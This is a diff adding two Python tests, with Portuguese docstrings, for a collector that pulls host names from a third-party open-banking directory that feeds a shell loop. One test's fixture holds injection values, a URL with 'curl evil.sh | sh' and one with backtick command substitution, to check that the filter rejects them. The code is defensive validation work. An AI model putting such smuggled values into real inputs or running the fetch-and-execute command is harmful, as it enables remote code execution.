@@ -147,6 +147,29 @@ def test_a_marca_tambem_casa_no_filtro() -> None:
     assert coletor.filtrados(lista, "apelido", None) == lista
 
 
+def test_o_host_so_sai_da_lista_se_tiver_forma_de_host() -> None:
+    """A lista alimenta um laço de shell, e o diretório é de terceiros.
+
+    Filtrar na origem em vez de escapar no destino é deliberado: o destino pode
+    mudar de dono — hoje é um `while read` no workflow, amanhã é outra coisa —
+    e o escape não viaja junto com o dado. O filtro, sim.
+    """
+    lista = [{"base": "https://api.bom.com.br/open-banking/opendata-investments/v1"},
+             {"base": "https://mau; curl evil.sh | sh/open-banking/opendata-investments/v1"},
+             {"base": "https://tambem`mau`/open-banking/opendata-investments/v1"},
+             {"base": "https://api.bom.com.br/outro/opendata-investments/v1"}]
+    assert coletor.hosts(lista) == ["api.bom.com.br"]
+
+
+def test_a_lista_de_hosts_nao_repete_e_guarda_a_ordem() -> None:
+    """Um host por linha, e cada um uma vez: dois endereços da mesma marca
+    apresentam o mesmo certificado, e diagnosticar duas vezes é gastar duas."""
+    lista = [{"base": "https://b.com.br/open-banking/opendata-investments/v1"},
+             {"base": "https://a.com.br/open-banking/opendata-investments/v1"},
+             {"base": "https://b.com.br/x/open-banking/opendata-investments/v1"}]
+    assert coletor.hosts(lista) == ["b.com.br", "a.com.br"]
+
+
 # --- paginação --------------------------------------------------------------
 
 def test_a_paginacao_para_no_total_declarado_pelo_envelope() -> None:
